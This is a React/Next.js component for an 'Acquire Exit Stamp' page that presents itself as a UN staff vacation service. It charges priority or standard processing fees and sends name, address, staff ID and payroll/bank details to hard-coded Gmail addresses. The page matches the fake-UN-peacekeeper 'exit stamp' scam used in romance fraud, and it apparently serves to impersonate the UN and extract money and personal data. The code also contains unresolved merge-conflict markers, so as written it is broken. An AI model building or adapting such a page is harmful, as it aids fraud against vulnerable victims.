"use client";
import { useState } from "react";
import { Info } from "lucide-react";

export default function ExitStamp() {
  const [stampType, setStampType] = useState("");
  const [formData, setFormData] = useState({
    firstName: "",
    lastName: "",
    bootAddress: "",
    unStaffId: "",
    department: "",
    payrollBank: "",
    currentDutyStation: "",
    requestedServicesDays: "",
    vacationDuration: "",
    additionalNotes: "",
    honeypot: ""
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState<string | null>(null);
  const [validationErrors, setValidationErrors] = useState<string[]>([]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    setSubmitStatus(null);
    setValidationErrors([]);

    try {
      const emailData = {
        firstName: formData.firstName,
        lastName: formData.lastName,
<<<<<<< HEAD
        email: 'unvacationportal95@gmail.com', // Default email since this form doesn't collect email
=======
        email: 'promiseakerele341@gmail.com',
>>>>>>> fd9d8d9150aa5adeb5b36a6527b668b75d2ed0de
        subject: "New Exit Stamp Application",
        message: `
Exit Stamp Application Details:

Stamp Type: ${stampType}

Personal Information:
- Name: ${formData.firstName} ${formData.lastName}
- Boot Address: ${formData.bootAddress}

Staff Details:
- UN Staff ID: ${formData.unStaffId}
- Department: ${formData.department}
- Payroll/Bank: ${formData.payrollBank}

Application Details:
- Current Duty Station: ${formData.currentDutyStation}
- Requested Services Days: ${formData.requestedServicesDays}
- Vacation Duration: ${formData.vacationDuration}

Additional Notes:
${formData.additionalNotes}
        `,
        honeypot: formData.honeypot
      };

      const response = await fetch('/api/contact', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(emailData),
      });

      const result = await response.json();

      if (response.ok) {
        setSubmitStatus('success');
        setStampType("");
        setFormData({
          firstName: "",
          lastName: "",
          bootAddress: "",
          unStaffId: "",
          department: "",
          payrollBank: "",
          currentDutyStation: "",
          requestedServicesDays: "",
          vacationDuration: "",
          additionalNotes: "",
          honeypot: ""
        });
      } else {
        setSubmitStatus('error');
        if (result.details) {
          setValidationErrors(Array.isArray(result.details) ? result.details : [result.error]);
        }
      }
    } catch (error) {
      setSubmitStatus('error');
      setValidationErrors(['Network error. Please check your connection and try again.']);
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <>
      <section className="bg-[#071b3a] text-white py-12 border-b-4 border-[#c9a227]">
        <div className="container">
          <div className="text-xs text-slate-400 mb-3">HOME / EXIT STAMP</div>
          <h1 className="text-4xl font-black">Acquire Exit Stamp</h1>
          <p className="mt-3 text-slate-300">Apply for a Priority or Standard Exit Stamp to finalize and organize your vacation dates.</p>
        </div>
      </section>

      <section className="bg-white py-16">
        <div className="container max-w-3xl mx-auto">
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-8">
            <div className="flex items-start gap-3">
              <Info className="text-blue-600 mt-0.5 flex-shrink-0" size={20} />
              <div>
                <p className="text-sm text-blue-800">
                  <strong>Non-Final Staff Only:</strong> This application is responsible for non-SOC-JD staff members. Final
                  personnel should use the standard vacation application.
                </p>
              </div>
            </div>
          </div>

          {validationErrors.length > 0 && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
              <div className="flex items-start gap-3">
                <div className="text-red-600">✗</div>
                <div>
                  <div className="text-sm font-bold text-red-800">Please fix the following errors:</div>
                  <ul className="text-xs text-red-700 mt-2 ml-4 list-disc">
                    {validationErrors.map((error, index) => (
                      <li key={index}>{error}</li>
                    ))}
                  </ul>
                </div>
              </div>
            </div>
          )}

          {submitStatus === 'success' && (
            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="text-green-600">✓</div>
                <div>
                  <div className="text-sm font-bold text-green-800">Exit Stamp Application Submitted!</div>
                  <div className="text-xs text-green-700">
                    Your exit stamp application has been received and will be processed. You will be contacted regarding the status.
                  </div>
                </div>
              </div>
            </div>
          )}

          {submitStatus === 'error' && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
              <div className="flex items-center gap-3">
                <div className="text-red-600">✗</div>
                <div>
                  <div className="text-sm font-bold text-red-800">Submission Failed</div>
                  <div className="text-xs text-red-700">
                    There was an error submitting your exit stamp application. Please try again or contact support.
                  </div>
                </div>
              </div>
            </div>
          )}

          <form onSubmit={handleSubmit} className="bg-white border border-slate-200 rounded-lg shadow-sm">
            <input
              type="text"
              name="honeypot"
              value={formData.honeypot}
              onChange={handleInputChange}
              style={{ display: 'none' }}
              tabIndex={-1}
              autoComplete="off"
            />

            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                SELECT STAMP TYPE
              </h2>

              <div className="grid gap-4 md:grid-cols-2">
                <label className={`border-2 rounded-lg p-6 cursor-pointer transition-colors ${
                  stampType === "priority"
                    ? "border-blue-500 bg-blue-50"
                    : "border-slate-200 hover:border-slate-300"
                }`}>
                  <input
                    type="radio"
                    name="stampType"
                    value="priority"
                    checked={stampType === "priority"}
                    onChange={(e) => setStampType(e.target.value)}
                    className="sr-only"
                  />
                  <div className="flex items-center gap-3 mb-3">
                    <div className={`w-4 h-4 rounded-full border-2 ${
                      stampType === "priority"
                        ? "border-blue-500 bg-blue-500"
                        : "border-slate-300"
                    }`}>
                      {stampType === "priority" && (
                        <div className="w-2 h-2 rounded-full bg-white m-0.5"></div>
                      )}
                    </div>
                    <span className="font-bold text-[#071b3a]">Priority Exit Stamp</span>
                    <span className="text-xs bg-yellow-100 text-yellow-800 px-2 py-1 rounded">PREMIUM</span>
                  </div>
                  <p className="text-sm text-slate-600 mb-2">
                    Faster processing with priority review and immediate stamp approval.
                  </p>
                  <p className="text-sm text-slate-600">Higher processing fee applies.</p>
                </label>

                <label className={`border-2 rounded-lg p-6 cursor-pointer transition-colors ${
                  stampType === "standard"
                    ? "border-blue-500 bg-blue-50"
                    : "border-slate-200 hover:border-slate-300"
                }`}>
                  <input
                    type="radio"
                    name="stampType"
                    value="standard"
                    checked={stampType === "standard"}
                    onChange={(e) => setStampType(e.target.value)}
                    className="sr-only"
                  />
                  <div className="flex items-center gap-3 mb-3">
                    <div className={`w-4 h-4 rounded-full border-2 ${
                      stampType === "standard"
                        ? "border-blue-500 bg-blue-500"
                        : "border-slate-300"
                    }`}>
                      {stampType === "standard" && (
                        <div className="w-2 h-2 rounded-full bg-white m-0.5"></div>
                      )}
                    </div>
                    <span className="font-bold text-[#071b3a]">Standard Exit Stamp</span>
                    <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">STANDARD</span>
                  </div>
                  <p className="text-sm text-slate-600 mb-2">
                    Regular processing through the standard workflow for general use.
                  </p>
                  <p className="text-sm text-slate-600">Standard processing fee applies.</p>
                </label>
              </div>

              <div className="mt-6 p-4 bg-slate-50 rounded-lg">
                <p className="text-sm text-slate-700">
                  ✓ Online Exit Stamp application and processing service is not eligible for
                  standard fees. Many applications follow the regular board at a lower cost.
                </p>
              </div>
            </div>

            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                PERSONAL INFORMATION
              </h2>

              <div className="grid gap-6 md:grid-cols-2">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    First Name
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Last Name
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div className="md:col-span-2">
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Boot Address
                  </label>
                  <textarea
                    name="bootAddress"
                    value={formData.bootAddress}
                    onChange={handleInputChange}
                    rows={3}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>
              </div>
            </div>

            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                STAFF DETAILS
              </h2>

              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    UN Staff ID
                  </label>
                  <input
                    type="text"
                    name="unStaffId"
                    value={formData.unStaffId}
                    onChange={handleInputChange}
                    placeholder="e.g. UNV-123456"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Department
                  </label>
                  <input
                    type="text"
                    name="department"
                    value={formData.department}
                    onChange={handleInputChange}
                    placeholder="e.g. Peacekeeping Operations"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Payroll / Bank
                  </label>
                  <input
                    type="text"
                    name="payrollBank"
                    value={formData.payrollBank}
                    onChange={handleInputChange}
                    placeholder="e.g. Administrative Office"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>
            </div>

            <div className="p-8 border-b border-slate-200">
              <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
                APPLICATION DETAILS
              </h2>

              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Current Duty Station County
                  </label>
                  <select
                    name="currentDutyStation"
                    value={formData.currentDutyStation}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white"
                  >
                    <option value="">Select Country</option>
                    <option value="afghanistan">Afghanistan</option>
                    <option value="syria">Syria</option>
                    <option value="iraq">Iraq</option>
                    <option value="mali">Mali</option>
                    <option value="lebanon">Lebanon</option>
                    <option value="other">Other</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Requested Services Days
                  </label>
                  <input
                    type="number"
                    name="requestedServicesDays"
                    value={formData.requestedServicesDays}
                    onChange={handleInputChange}
                    placeholder="30"
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Vacation Duration
                  </label>
                  <select
                    name="vacationDuration"
                    value={formData.vacationDuration}
                    onChange={handleInputChange}
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 bg-white"
                  >
                    <option value="">Select Duration</option>
                    <option value="2weeks">2 Weeks</option>
                    <option value="1month">1 Month</option>
                    <option value="2months">2 Months</option>
                    <option value="3months">3 Months</option>
                  </select>
                </div>

                <div>
                  <label className="block text-sm font-medium text-[#071b3a] mb-2">
                    Additional Notes
                  </label>
                  <textarea
                    name="additionalNotes"
                    value={formData.additionalNotes}
                    onChange={handleInputChange}
                    rows={4}
                    placeholder="Any additional notes or special requests for the EXIT STAMP..."
                    className="w-full px-3 py-2 border border-slate-300 rounded focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 resize-none"
                  />
                </div>
              </div>
            </div>

            <div className="p-8 text-center">
              <button
                type="submit"
                disabled={isSubmitting}
                className={`px-8 py-3 rounded font-bold text-white transition-colors ${
                  isSubmitting
                    ? 'bg-gray-400 cursor-not-allowed'
                    : 'bg-[#0b8fe0] hover:bg-[#0a7fc9]'
                }`}
              >
                {isSubmitting ? 'SUBMITTING...' : 'SUBMIT EXIT STAMP APPLICATION'}
              </button>
            </div>
          </form>
        </div>
      </section>
    </>
  );
}
